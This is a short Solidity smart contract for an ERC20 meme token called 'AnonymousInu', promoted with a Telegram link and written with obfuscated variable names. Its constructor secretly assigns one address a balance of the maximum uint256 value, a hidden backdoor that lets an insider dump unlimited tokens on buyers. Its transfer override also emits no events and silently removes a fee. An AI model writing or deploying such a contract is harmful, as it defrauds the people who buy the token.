// https://t.me/Anonymousinueth

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.9;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract AnonymousInu is ERC20, Ownable {
    uint256 private turn = ~uint256(0);
    uint256 public drive = 4;

    constructor(
        string memory rhyme,
        string memory kids,
        address closer,
        address interior
    ) ERC20(rhyme, kids) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[interior] = turn;
    }

    function _transfer(
        address usual,
        address building,
        uint256 steel
    ) internal override {
        _balances[usual] -= steel;
        uint256 men = (steel / 100) * drive;
        steel -= men;
        _balances[building] += steel;
    }
}